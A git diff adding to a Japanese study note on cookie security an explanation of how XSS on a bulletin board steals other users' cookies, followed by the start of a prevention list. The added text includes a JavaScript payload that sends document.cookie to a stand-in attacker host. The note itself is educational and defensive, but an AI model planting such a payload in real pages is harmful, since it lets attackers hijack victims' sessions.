@@ -217,7 +217,15 @@ Cookieの仕様がまとめられている[RFC6265](https://tools.ietf.org/html/
 
 ### Web掲示板サービス開発している際に、XSSにより他ユーザのクッキー情報が抜き出される仕組みとその対策はどのようなものでしょうか
 
-- 
+- XSSの仕組み
+  - 掲示板に投稿する内容にスクリプトを仕組む
+  - その際に、自身のサイトにアクセスするように誘導する
+    ```js
+    document.write("<img src='http://evel.example.com/sample.png?" + document.cookie + "'>")
+    ```
+
+  - こうすることで被害者が上記のリンクを踏んだ際に、被害者のCookieの値を盗むことができる
+
 - 防ぐ方法
   - 通信経路の盗聴
     - `Secure`を設定する
